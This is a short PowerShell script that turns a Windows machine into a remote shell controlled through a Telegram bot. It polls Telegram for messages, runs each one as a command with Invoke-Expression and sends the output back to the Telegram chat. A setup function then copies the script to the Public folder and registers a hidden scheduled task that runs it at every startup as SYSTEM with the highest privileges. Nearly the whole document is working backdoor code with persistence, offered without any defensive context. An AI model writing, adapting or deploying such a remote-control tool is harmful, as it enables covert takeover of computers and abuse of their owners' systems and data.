# Load Bot Token and Chat ID from Environment Variables
$botToken = [System.Environment]::GetEnvironmentVariable("TELEGRAM_BOT_TOKEN", "User")
$chatId = [System.Environment]::GetEnvironmentVariable("TELEGRAM_CHAT_ID", "User")
$apiUrl = "https://api.telegram.org/bot$botToken"

# Function to send messages to Telegram
function Send-Message($message) {
    Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body @{
        chat_id = $chatId
        text = $message
    }
}

# Function to get the latest command from Telegram
function Get-Command() {
    $updates = Invoke-RestMethod -Uri "$apiUrl/getUpdates"
    if ($updates.result) {
        return $updates.result[-1].message.text
    }
    return $null
}

# Notify that the bot is active
Send-Message "✅ PowerShell Bot Activated. Awaiting commands..."

# Loop to check for Telegram commands
while ($true) {
    $command = Get-Command
    if ($command -eq "exit") {
        Send-Message "🚫 PowerShell bot shutting down..."
        break
    }
    elseif ($command) {
        $output = Invoke-Expression $command 2>&1
        Send-Message "```\n$output\n```"
    }
    Start-Sleep -Seconds 3  # Polling interval
}

# Function to set up auto-start using Task Scheduler
function Setup-Startup() {
    $scriptPath = "$env:PUBLIC\telegram-shell.ps1"
    Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force

    $taskName = "TelegramShell"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File $scriptPath"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal
    Send-Message "🚀 Bot is now set to run on startup!"
}

# Run startup setup (Only do this once, you can remove this line after first run)
Setup-Startup
